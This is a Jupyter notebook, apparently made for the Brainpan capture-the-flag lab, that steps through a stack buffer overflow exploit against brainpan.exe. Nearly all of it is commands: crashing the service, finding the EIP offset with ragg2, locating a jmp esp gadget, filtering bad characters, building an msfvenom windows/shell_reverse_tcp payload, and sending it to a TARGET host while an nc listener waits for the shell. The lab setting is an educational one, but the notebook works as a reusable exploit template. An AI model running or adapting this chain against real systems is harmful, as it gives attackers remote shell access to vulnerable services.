{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "32a20618-f056-4062-b4df-6715b1c72748",
   "metadata": {},
   "source": [
    "# Crash Target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "43187a78-bbab-408c-ac74-ae4eb6e04123",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Run this:\n",
      "winedbg brainpan.exe\n"
     ]
    }
   ],
   "source": [
    "!echo Run this:\n",
    "!echo winedbg brainpan.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4968386-95a7-47c3-9cac-aff28b5fe241",
   "metadata": {},
   "outputs": [],
   "source": [
    "from web_footprinting_utils import show_term\n",
    "\n",
    "show_term(\"http://10.10.232.141\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f0761546-5868-4820-b142-5e4b8fb7c3b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "!python3 -c \"print('1'*9999)\" | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e5bdee27-ae9f-448a-af52-274f101e10eb",
   "metadata": {},
   "source": [
    "# Generate Cyclic Pattern:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "262b2f3e-f04c-42e6-abdb-0c54af24dd8a",
   "metadata": {},
   "outputs": [],
   "source": [
    "!ragg2 -P 9999 -r | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a19ba23-4622-4d2a-9ba9-4ec669d7f0db",
   "metadata": {},
   "source": [
    "# Locate EIP Offset:\n",
    "\n",
    "insert EIP addr:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79988c3f-f4b3-44a1-b7dc-7717ab7120b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "!ragg2 -q 0x43413243"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a5e504c2-6beb-40e9-a131-ec5f2283898c",
   "metadata": {},
   "source": [
    "# Overwrite EIP and ESP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8fc8550-6958-47f9-9850-279009fec66e",
   "metadata": {},
   "outputs": [],
   "source": [
    "!printf \"AAAAAAAAAAA\" > payload-suffix.txt\n",
    "!ragg2 -P 524 -r -C payload-suffix.txt | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "624282cc-e5bf-4ec4-b2f0-1265870024f9",
   "metadata": {},
   "source": [
    "# Locate JMPs to ESP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93104a0b-207b-474e-a3d1-5573a42b5408",
   "metadata": {},
   "outputs": [],
   "source": [
    "!r2 brainpan.exe -c \"/ao jmp esp\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab908103-5038-4711-b053-a7584842def7",
   "metadata": {},
   "source": [
    "# Create Badchar Payload:\n",
    "\n",
    "Make sure to put jmp location in little endian:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "038bc6a8-4d04-4574-8350-3b6706442a83",
   "metadata": {},
   "outputs": [],
   "source": [
    "python3 -c \"print('a' * 524, end='')\" > payload.txt\n",
    "printf \"\\xf3\\x12\\x17\\x31\" >> payload.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4228a4c3-594f-4370-992f-314c0d63bcc5",
   "metadata": {},
   "source": [
    "# Filter Badchars:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eecbce4e-b524-47be-b923-14799ce785d4",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_goodchars(badchars=\"\"):\n",
    "    bytearray_value = \"\"\n",
    "    \n",
    "    human_readable = bytes(badchars, encoding=\"unicode-escape\").decode(\"ascii\")\n",
    "    badints = [int(x, 16) for x in human_readable.split(\"\\\\\\\\x\")[1:]]\n",
    "    print(human_readable, badints)\n",
    "    \n",
    "    for x in range(1, 256):\n",
    "        if x in badints:\n",
    "            continue\n",
    "        else:\n",
    "            bytearray_value += \"\\\\x\" + \"{:02x}\".format(x)\n",
    "    bytearray_bytes =bytes(bytearray_value, encoding='ascii').decode('unicode_escape')\n",
    "    return bytearray_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d677c58a-1d50-4b46-b611-aa8ada5bc09f",
   "metadata": {},
   "outputs": [],
   "source": [
    "bytearray_value = get_goodchars()\n",
    "print(bytearray_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "894649ac-a7fe-429d-b17e-cf036407361b",
   "metadata": {},
   "outputs": [],
   "source": [
    "cat payload.txt chars.txt | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30422623-a402-41ad-bf23-83d9e810332f",
   "metadata": {},
   "source": [
    "In winedbg:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "955c2084-39ba-4b34-a7af-1473e619e88a",
   "metadata": {},
   "outputs": [],
   "source": [
    "hexdump -C payload.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "64e15a1f-14db-40aa-a1d6-7c763a0d1db3",
   "metadata": {},
   "outputs": [],
   "source": [
    "info stack 32"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4d9a158-d4e3-42a4-af1c-9ca25dcea179",
   "metadata": {},
   "outputs": [],
   "source": [
    "badchars = \"\\x00\\x09\\x0d\\x0a\\x20\\xff\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5f72758a-1f47-4b46-87ed-a6d2d2dcc050",
   "metadata": {},
   "source": [
    "Make sure it matches hexdump! Enter differences into badchars and try again"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44082e77-7056-4663-aab5-ee47675b79c9",
   "metadata": {},
   "source": [
    "# Create Local Payload:\n",
    "\n",
    "Make sure to insert badchars from above:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4720fdb8-88d4-4e96-8865-6fad1edb9ae9",
   "metadata": {},
   "outputs": [],
   "source": [
    "!msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=7777 EXITFUNC=thread -f raw -b \"\\x00\\x09\\x0d\\x0a\\x20\\xff\" -n 32 > payload_suffix.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c7cf5ce-c051-4ffa-8607-883eeccbf4b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "target = \"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d06c3dec-0bba-4d46-87db-d577ebf670d2",
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo Run this:\n",
    "!echo rlwrap nc -lvnp 7777"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f89605b3-608e-45ea-898e-7107db88715b",
   "metadata": {},
   "outputs": [],
   "source": [
    "!cat payload.txt payload_suffix.txt | ncat 127.0.0.1 9999"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c32d344-1e04-4b71-8445-a19183857e49",
   "metadata": {},
   "source": [
    "# Create Final Payload:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "617356e7-aa26-47b2-91fb-9f35f38745f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "LHOST = \"\"\n",
    "TARGET = \"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a7fd7bf-a12f-4190-ab1f-8612fc1b6755",
   "metadata": {},
   "outputs": [],
   "source": [
    "!msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=7777 EXITFUNC=thread -f raw -b \"\\x00\\x09\\x0d\\x0a\\x20\\xff\" -n 32 > payload_suffix.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ffa2a7f2-ef33-4e0c-a918-dd7269333a63",
   "metadata": {},
   "outputs": [],
   "source": [
    "!echo rlwrap nc -lvnp 7777"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90e5cb6e-4628-40fa-8db6-8a688e5933c0",
   "metadata": {},
   "outputs": [],
   "source": [
    "!cat payload.txt payload_suffix.txt | ncat {TARGET} 9999"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
